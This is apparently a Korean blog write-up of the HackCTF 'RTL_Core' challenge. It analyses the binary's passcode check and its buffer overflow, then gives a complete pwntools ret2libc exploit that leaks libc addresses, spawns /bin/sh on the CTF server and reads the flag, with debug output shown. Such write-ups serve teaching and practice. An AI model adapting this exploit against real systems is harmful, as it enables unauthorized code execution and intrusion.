**HackCTF - RTL_Core**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - RTL_Core| Y3oj4eng | writeup    | writeupwargame |


# Analysis
---

```bash
mac at ubuntu in ~/Desktop/hackCTF/RTLcore
$ ll
total 1.8M
-rw-rw-r-- 1 mac mac 1.7M Apr 14  2019 libc.so.6
-rwxr-xr-x 1 mac mac 7.5K Nov 10  2018 rtlcore
```

이번 문제도 바이너리와 함께 `libc` 파일이 주어졌다.

## `file & checksec`

```
mac at ubuntu in ~/Desktop/hackCTF/RTLcore
$ file rtlcore
rtlcore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=fa498ff4575e4f3bbca6fa07300ef79f319cfa04, not stripped
```
```bash
Reading symbols from rtlcore...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

`NX` 미티게이션이 적용되어져 있다.

문제의 이름과 `checksec` 상태로 봤을떄, `RTL`을 활용한 문제로 예상된다.

실행권한을 주고 바이너리를 실행시켜본다.

```bash
mac at ubuntu in ~/Desktop/hackCTF/RTLcore
$ ./rtlcore
코어 파일에 액세스중입니다...
패스코드를 입력해주세요
Passcode: AAAAAAAAAAAAA
실패!
```

바이너리를 실행시키면 일련의 문자열을 출력하고 값을 입력받는다.

해당 값(Passcode)에 따라 검증을 통한 분기를 진행하는 것으로 보인다.

`IDA` 를 이용해 분석을 이어나간다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-1Ch]

  setvbuf(_bss_start, 0, 2, 0);
  puts(&::s);
  printf("Passcode: ");
  gets(&s);
  if ( check_passcode(&s) == hashcode )
  {
    puts(&byte_8048840);
    core();
  }
  else
  {
    puts(&byte_8048881);
  }
  return 0;
}
```

`main` 함수다.

문자열을 출력하고 `Passcode`를 `s`변수에 `gets()` 를 통해 입력받는다.

이후, 분기를 통해 `check_passcode(&s)` 값이 `hashcode` 와 같을경우, `core` 함수를 실행시킨다.

그 외에는 `실패` 라는 문자열을 출력하고 프로그램을 종료한다.

`check_passcode` 와 `core` 함수를 살펴보자.

```c
int __cdecl check_passcode(int a1)
{
  int v2; // [esp+8h] [ebp-8h]
  signed int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}
```
`check_passcode` 함수다.

위 함수는 5번 반복하면서 전달받은 주소값을 기준으로 4bytes씩 증가시켜 순치적으로 접근하여 해당 값들을 `v2` 변수에 더하여 반환한다.

`hashcode` 값을 확인해보자.
![image](https://user-images.githubusercontent.com/33051018/76521772-d2ac1e00-64a8-11ea-898f-266c48639e49.png)

`hashcode`는 `0xc0d9b0a7` 이다.

```python
mac at ubuntu in ~/Desktop/hackCTF/RTLcore
$ python
Python 2.7.17 (default, Nov  7 2019, 10:07:09)
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hashcode = 0xc0d9b0a7
>>> divide = 0xc0d9b0a7 / 5
>>> print(divide)
647098401
>>> print(hex(divide))
0x2691f021
>>> print(hex(divide * 5))
0xc0d9b0a5
```

이를 5로 나누면 `0x2691f021` 이다.
하지만 다시 5를 곱해보면 2가 부족한 `0xc0d9b0a5`값이 나온다.

따라서 `0x2691f021` * 4 + `0x2691f023`을 전달해보도록 한다.
```python
from pwn import *                                                              
p = process('./rtlcore')                                                                 

payload = ''                                                                             
payload += p32(0x2691f021) * 4                                                           
payload += p32(0x2691f023)                                                               

p.recvuntil('Passcode: ')                                                                
p.sendline(payload)                                                                      
print(p.recv(1024))
```

```bash
mac at ubuntu in ~/Desktop/hackCTF/RTLcore                                               
$ python ex.py                                                                           
[+] Starting local process './rtlcore': pid 3018                                         
코드가 일치하구나. 좋아, 다음 단서를 던져주지                                            
너에게 필요한 것은 바로 0xf7d702d0 일거야
```

굳. 분기문은 통과했다.

분기문을 통과하니 나에게 필요한 것이라며 주소값으로 보이는 16진수를 던져준다.

위 출력내용은 `core` 함수에서 출력했을테니 `core` 함수를 살펴보도록 한다.

```c
ssize_t core()
{
  int buf; // [esp+Ah] [ebp-3Eh]
  int v2; // [esp+Eh] [ebp-3Ah]
  __int16 v3; // [esp+12h] [ebp-36h]
  int v4; // [esp+38h] [ebp-10h]
  void *v5; // [esp+3Ch] [ebp-Ch]

  buf = 0;
  v2 = 0;
  v4 = 0;
  memset(
    (void *)((unsigned int)&v3 & 0xFFFFFFFC),
    0,
    4 * (((unsigned int)((char *)&v2 - ((unsigned int)&v3 & 0xFFFFFFFC) + 46) & 0xFFFFFFFC) >> 2));
  v5 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v5);
  return read(0, &buf, 0x64u);
}
```

`dlsym` 함수를 이용해 `pritnf` 함수의 주소를 출력한다.

`dlsym` 은 라이브러리 내 symbol(함수 또는 전역변수)의 위치에 대한 포인터를 얻는다.

이후 `read` 함수를 통해 `buf` 변수에 `100bytes`를 입력받는다.

여기서 `buf` 변수는 `0x3E`, 62bytes의 길이를 가지므로 SFP까지 더해도 66bytes 뿐이다. 따라서 `BOF`를 시도해 볼 수 있으며 

위에서 얻은 `printf` 함수를 통해 `system` 함수의 주소와 `binsh` 문자열 주소를 얻어서 익스를 해보도록 한다.


# Exploit
---
```python
from pwn import *

context.log_level = 'debug'

p = remote('ctf.j0n9hyun.xyz', 3015)
#p = process('./rtlcore')
e = ELF('./rtlcore')
libc = ELF('./libc.so.6')

# bypass the authentication
payload = ''
payload += p32(0x2691f021) * 4
payload += p32(0x2691f023)

p.recvuntil('Passcode')
p.sendline(payload)

# get the printf_addr
p.recvuntil('0x')
printf_addr = int(p.recv(8), 16)

# get some address for exploit
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh').next()

log.info('libc_base : ' + str(hex(libc_base)))
log.info('system_addr : ' + str(hex(system_addr))
log.info('binsh_addr : ' + str(hex(binsh_addr)))

# exploit
payload = ''
payload += 'A' * 66
payload += p32(system_addr)
payload += 'A' * 4
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()
```

## Result
```bash
mac at ubuntu in ~/Desktop/hackCTF/RTLcore
$ python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3015: Done
[DEBUG] PLT 0x8048450 read
[DEBUG] PLT 0x8048460 printf
[DEBUG] PLT 0x8048470 gets
[DEBUG] PLT 0x8048480 puts
[DEBUG] PLT 0x8048490 __libc_start_main
[DEBUG] PLT 0x80484a0 dlsym
[DEBUG] PLT 0x80484b0 setvbuf
[DEBUG] PLT 0x80484c0 __gmon_start__
[*] '/home/mac/Desktop/hackCTF/RTLcore/rtlcore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/home/mac/Desktop/hackCTF/RTLcore/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x57 bytes:
    00000000  ec bd 94 ec  96 b4 20 ed  8c 8c ec 9d  bc ec 97 90  │····│·· ·│····│····│
    00000010  20 ec 95 a1  ec 84 b8 ec  8a a4 ec a4  91 ec 9e 85  │ ···│····│····│····│
    00000020  eb 8b 88 eb  8b a4 2e 2e  2e 0a ed 8c  a8 ec 8a a4  │····│··..│.···│····│
    00000030  ec bd 94 eb  93 9c eb a5  bc 20 ec 9e  85 eb a0 a5  │····│····│· ··│····│
    00000040  ed 95 b4 ec  a3 bc ec 84  b8 ec 9a 94  0a 50 61 73  │····│····│····│·Pas│
    00000050  73 63 6f 64  65 3a 20                               │scod│e: │
    00000057
[DEBUG] Sent 0x15 bytes:
    00000000  21 f0 91 26  21 f0 91 26  21 f0 91 26  21 f0 91 26  │!··&│!··&│!··&│!··&│
    00000010  23 f0 91 26  0a                                     │#··&│·│
    00000015
[DEBUG] Received 0x40 bytes:
    00000000  ec bd 94 eb  93 9c ea b0  80 20 ec 9d  bc ec b9 98  │····│····│· ··│····│
    00000010  ed 95 98 ea  b5 ac eb 82  98 2e 20 ec  a2 8b ec 95  │····│····│·. ·│····│
    00000020  84 2c 20 eb  8b a4 ec 9d  8c 20 eb 8b  a8 ec 84 9c  │·, ·│····│· ··│····│
    00000030  eb a5 bc 20  eb 8d 98 ec  a0 b8 ec a3  bc ec a7 80  │··· │····│····│····│
    00000040
[DEBUG] Received 0x38 bytes:
    00000000  0a eb 84 88  ec 97 90 ea  b2 8c 20 ed  95 84 ec 9a  │····│····│·· ·│····│
    00000010  94 ed 95 9c  20 ea b2 83  ec 9d 80 20  eb b0 94 eb  │····│ ···│··· │····│
    00000020  a1 9c 20 30  78 66 37 64  39 38 30 32  30 20 ec 9d  │·· 0│xf7d│9802│0 ··│
    00000030  bc ea b1 b0  ec 95 bc 0a                            │····│····│
    00000038
[*] libc_base = 0xf7d4f000
[*] system_addr = 0xf7d89940
[*] binsh_addr = 0xf7ea802b
[DEBUG] Sent 0x4f bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 40 99  d8 f7 41 41  41 41 2b 80  ea f7 0a     │AA@·│··AA│AA+·│···│
    0000004f
[*] Switching to interactive mode
 일거야
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xa bytes:
    'flag\n'
    'main\n'
flag
main
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x28 bytes:
```

이제 좀 감이 잡힌다!


